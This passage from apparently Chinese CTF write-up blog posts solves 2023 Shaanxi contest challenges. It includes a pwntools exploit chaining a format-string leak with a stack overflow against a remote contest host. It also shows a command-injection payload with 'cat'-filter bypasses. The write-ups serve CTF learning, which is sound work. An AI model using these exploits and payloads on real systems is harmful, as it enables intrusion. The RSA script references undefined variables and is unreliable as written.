+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155910234.png" alt="image-20230603155910234"></p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155919456.png" alt="image-20230603155919456"></p>
+<p>对照密码表得到密码</p>
+<p>BC1PVEYD</p>
+<p>然后用steghide</p>
+<p>得到flag  </p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603160013974.png" alt="image-20230603160013974"></p>
+<h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><p>lsb</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603161531504.png" alt="image-20230603161531504"></p>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="HaM3"><a href="#HaM3" class="headerlink" title="HaM3"></a>HaM3</h4><p>这题找到了原题<a target="_blank" rel="noopener" href="https://blog.cryptohack.org/cryptoctf2021-easy#hamul">CryptoCTF 2021 - Easy | CryptoHack Blog</a></p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603182101684.png" alt="image-20230603182101684"></p>
+<p>差不太多,加一层爆破就跑出来了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = 142672086626283587048017713116658568907056287246536918432205313755474498483915485435443731126588499776739329317569276048159601495493064346081295993762052633</span><br><span class="line"></span><br><span class="line">high = str(n)[:18]</span><br><span class="line">low = str(n)[-18:]</span><br><span class="line">pq=[]</span><br><span class="line">for i in range(10):</span><br><span class="line">for j in range(10):</span><br><span class="line">for z in range(10):</span><br><span class="line">pq.append(int(high + str(i) + str(j) +str(z) + low))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for x in pq:</span><br><span class="line">f = factor(x)</span><br><span class="line">if (len(f) == 2 and f[0][0].nbits() == 64):</span><br><span class="line">p, q = f[0][0], f[1][0]</span><br><span class="line">print(p,q)</span><br><span class="line">break</span><br><span class="line"></span><br><span class="line">p,q = 9937378783676979077,14357114660923972229</span><br><span class="line">c = 35771468551700967499031290145813826705314774357494021918317304230766070868171631520643911378972522363861624359732252684003796428570328730483253546904382041</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">PP = int(str(int(str(p) + str(q))) + str(int(str(q) + str(p))))</span><br><span class="line">QQ = int(str(Q) + str(P))</span><br><span class="line">d = inverse(e,(PP-1)*(QQ-1))</span><br><span class="line">m = pow(c,d,PP*QQ)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="陕西游玩"><a href="#陕西游玩" class="headerlink" title="陕西游玩"></a>陕西游玩</h4><p>首先checksec看一下</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185926159.png" alt="image-20230603185926159"></p>
+<p>主要的是pie保护。</p>
+<p>IDA打开看看，</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185942074.png" alt="IMG_259"></p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603190043963.png" alt="image-20230603190043963"></p>
+<p>发现程序是有三个函数，1；2；3选择进入</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603190028841.png" alt="image-20230603190028841"></p>
+<p>huashan是一个溢出点，</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603190102061.png" alt="image-20230603190102061"></p>
+<p>terra是一个格式化字符串漏洞。</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603190113173.png" alt="image-20230603190113173"></p>
+<p>xi_an有一个gadgets。</p>
+<p>现在就有了思路，首先格式化字符串泄露main函数真实地址，求出基地址，找到gadgets的真实地址，然后栈溢出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&quot;121.196.192.181&quot;,10001)</span><br><span class="line">#p=process(&quot;./kj&quot;)</span><br><span class="line">elf=ELF(&#x27;./kj&#x27;)</span><br><span class="line">context(log_level = &#x27;debug&#x27;,arch = &#x27;amd64&#x27;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;Your choice :\n&quot;)</span><br><span class="line">p.sendline(b&#x27;2&#x27;)</span><br><span class="line">p.recvuntil(b&quot;Welcome to Terra_Cotta_Warriors\n&quot;)</span><br><span class="line">p.send(b&#x27;%19$p&#x27;)</span><br><span class="line">base=int(p.recv(14),16)-0x12eb</span><br><span class="line">print(&quot;base=&quot;,hex(base))</span><br><span class="line">docker=base+0x129A</span><br><span class="line">p.recvuntil(b&quot;Your choice :\n&quot;)</span><br><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">p.recvuntil(b&quot;Welcome to Huashan_Mountain\n&quot;)</span><br><span class="line">payload=b&#x27;a&#x27;*0x28+p64(docker)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="我的upx-d怎么坏了"><a href="#我的upx-d怎么坏了" class="headerlink" title="我的upx -d怎么坏了"></a>我的upx -d怎么坏了</h4><p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185725422.png" alt="image-20230603185725422"><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45986910/article/details/107993680">https://blog.csdn.net/weixin_45986910/article/details/107993680</a></p>
+<p>手脱壳参照的博客。</p>
+<p>脱壳之后用ida32打开<br><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185655860.png" alt="image-20230603185655860"></p>
+<p> 一眼丁真迷宫题，静态分析了一下<img src="file:///C:/Users/86186/AppData/Local/Temp/msohtmlclip1/01/clip_image006.gif" alt="img"></p>
+<p>可以看出来是一个15*15的迷宫，直接写脚本画出迷宫</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185706240.png" alt="image-20230603185706240"><br> 看提示是最短路径，</p>
+<p>那应该是“RRRDRRURRRRRRDDDDRDDDflag”</p>
+<p>flag为这串字符的md5 32位小写。</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185625545.png" alt="image-20230603185625545"><br> 接下来先base解密，然后减3异或8即可rs3 &#x3D; “qglrv@onmlqpA&gt;qmq&gt;mBo3A?Bn&lt;lppA@;lp4nx”rs4 &#x3D; “”for i in range(len(rs3)):  rs4 +&#x3D; chr((ord(rs3[i]) - 3) ^ 8)print(rs4)<br><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185614952.png" alt="image-20230603185614952"></p>
+<h4 id="babypython"><a href="#babypython" class="headerlink" title="babypython"></a>babypython</h4><p>划到最下面会看见一个类似base64编码的字符</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185558087.png" alt="image-20230603185558087"></p>
+<p>首先把这串字符串1换成g,3换成H,9换成W，然后倒序，然后base64解码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">mapping = &#123;&quot;1&quot;: &quot;g&quot;, &quot;3&quot;: &quot;H&quot;, &quot;9&quot;: &quot;W&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_str = input(&quot;请输入要处理的字符串：&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for old_char, new_char in mapping.items():</span><br><span class="line">    input_str = input_str.replace(old_char, new_char)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_str = input_str[::-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decoded_str = base64.b64decode(input_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;处理后的字符串为：&quot;,decoded_str)</span><br><span class="line">#qglrv@onmlqpA&gt;qmq&gt;mBo3A?Bn&lt;lppA@;lp4nx</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185434220.png" alt="image-20230603185434220"></p>
+<p>然后把得到的字符串减3最后再异或8。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 获取输入字符串</span><br><span class="line">input_str = input(&quot;请输入要处理的字符串：&quot;)</span><br><span class="line"></span><br><span class="line"># 初始化输出字符串</span><br><span class="line">output_str = &quot;&quot;</span><br><span class="line"></span><br><span class="line">\# 遍历输入字符串中的每个字符并将其先减3再异或8</span><br><span class="line"></span><br><span class="line">for char in input_str:</span><br><span class="line"></span><br><span class="line">  \# 将字符转换为ASCII码，减去3，异或8，然后将结果转换回字符</span><br><span class="line"></span><br><span class="line">  new_char = chr((ord(char) - 3) ^ 8)</span><br><span class="line"></span><br><span class="line">  \# 将新字符添加到输出字符串末尾</span><br><span class="line"></span><br><span class="line">  output_str += new_char</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">\# 输出结果字符串</span><br><span class="line"></span><br><span class="line">print(&quot;处理后的字符串为：&quot;, output_str)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185533883.png" alt="image-20230603185533883"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-rce2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/07/02/rce2/" class="article-date">
+  	<time datetime="2023-07-02T02:04:39.000Z" itemprop="datePublished">2023-07-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/07/02/rce2/">
+        rce2
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="/2023/07/02/rce2/image-20230113171222679.png" alt="image-20230113171222679"></p>
+<p><img src="/2023/07/02/rce2/image-20230113171252636.png" alt="image-20230113171252636"></p>
+<p><img src="/2023/07/02/rce2/image-20230113171319578.png" alt="image-20230113171319578"></p>
+<p><img src="/2023/07/02/rce2/image-20230113171436988.png" alt="image-20230113171436988"></p>
+<p><img src="/2023/07/02/rce2/image-20230113171512474.png" alt="image-20230113171512474"></p>
+<p><img src="/2023/07/02/rce2/image-20230320212202869.png" alt="image-20230320212202869"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">简单用法就是ls /|tee 1</span><br><span class="line"></span><br><span class="line">|前面的是执行的操作,1是自定义文件名</span><br><span class="line"></span><br><span class="line">tee指令会把ls /的内容输出到1这个文件中</span><br><span class="line"></span><br><span class="line">payload:dozer=ls |tee 1(这里查看当前目录)</span><br><span class="line"></span><br><span class="line">再去访问43.137.36.41:13000/1</span><br><span class="line"></span><br><span class="line">就会下载1这个文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/02/rce2/image-20230320212356252.png" alt="image-20230320212356252"></p>
+<p><img src="/2023/07/02/rce2/image-20230113171553435.png" alt="image-20230113171553435"></p>
+<p><img src="/2023/07/02/rce2/image-20230113171629267.png" alt="image-20230113171629267"></p>
+<p><img src="/2023/07/02/rce2/image-20230113171713856.png" alt="image-20230113171713856"></p>
+<p><img src="/2023/07/02/rce2/image-20230426201350130.png" alt="image-20230426201350130"></p>
+<p><img src="/2023/07/02/rce2/image-20230113172242572.png" alt="image-20230113172242572"></p>
+<p><img src="/2023/07/02/rce2/image-20230113172437119.png" alt="image-20230113172437119"></p>
+<p><img src="/2023/07/02/rce2/image-20230113172757240.png" alt="image-20230113172757240"></p>
+<p><img src="/2023/07/02/rce2/image-20230113172818334.png" alt="image-20230113172818334"></p>
+<p><img src="/2023/07/02/rce2/image-20230113172852579.png" alt="image-20230113172852579"></p>
+<p><img src="/2023/07/02/rce2/image-20230113173216152.png" alt="image-20230113173216152"></p>
+<p><img src="/2023/07/02/rce2/image-20230113173233725.png" alt="image-20230113173233725"></p>
+<p>cat被过滤 可以使用tac more head tail等命令绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">查看文本内容</span><br><span class="line">查看全部文本内容：</span><br><span class="line">1、cat命令</span><br><span class="line">cat file_name</span><br><span class="line">#输出所有文本内容</span><br><span class="line">3、cat -n file_name</span><br><span class="line">#文本内容所有行加上行编号输出</span><br><span class="line">3、cat -b file_name</span><br><span class="line">#文本内容非空行加上行编号输出</span><br><span class="line"></span><br><span class="line">分页查看文本内容：</span><br><span class="line">1、more命令(常用的分页工具)</span><br><span class="line">more file_name</span><br><span class="line">2、less命令（more升级版分页工具)</span><br><span class="line">less file_name</span><br><span class="line">#显示行加-N参数，less -N file_name</span><br><span class="line">#更多命令及使用方法查看less --help或man less</span><br><span class="line"></span><br><span class="line">查看部分文件内容</span><br><span class="line">head 命令：显示文件开头一些行的内容，默认显示文件前10行</span><br><span class="line">1，查看显示文首内容 head -n [number] file_name ，显示文首多少行内容</span><br><span class="line">head -n 100 file_name</span><br><span class="line">#显示文首一百行内容</span><br><span class="line">#或不加-n，head -100 file_name也是显示文尾100行内容</span><br><span class="line">2、输出文首最后的多少个字节</span><br><span class="line">head -c 10 file_name</span><br><span class="line"></span><br><span class="line">tail 命令：显示文件最后一些行的内容，默认显示文件后10行</span><br><span class="line">1、查看显示文尾内容 tail -n [number] file_name ，显示文尾多少行内容</span><br><span class="line">tail -n 100 file_name</span><br><span class="line">#显示文尾一百行内容</span><br><span class="line">#或不加-n，tail -100 file_name也是显示文尾100行内容</span><br><span class="line">2、当文件增长时输出追加的数据，比如日志时时生成，(crtl+c终止显示)</span><br><span class="line">tail -f log_file</span><br><span class="line">3、加-f参数显示追加是数据时可以与-s参数配置，睡眠几秒在进行追加显示</span><br><span class="line">tail -f -s 10 log_file</span><br><span class="line">#查看日志内容，10秒刷新一次</span><br><span class="line">4、输出文尾最后的多少个字节</span><br><span class="line">tail -c 10 file_name</span><br></pre></td></tr></table></figure>
 
       
     </div>
